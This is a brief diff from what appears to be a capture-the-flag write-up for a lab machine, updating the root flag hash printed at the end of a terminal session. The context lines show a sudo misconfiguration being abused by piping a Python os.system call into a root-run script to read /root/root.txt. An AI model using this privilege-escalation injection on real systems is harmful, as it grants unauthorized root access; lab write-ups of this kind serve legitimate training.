@@ -94,4 +94,4 @@ richard@stratosphere:~$ sudo -l
 (ALL) NOPASSWD: /usr/bin/python* /home/richard/test.py
 
 richard@stratosphere:~$ echo '__import__("os").system("cat /root/root.txt")' | sudo python2 ~/test.py
-d41d8cd98f00b204e9800998ecf8427e
+fa02b3f156ed1478ca43842f870265ce
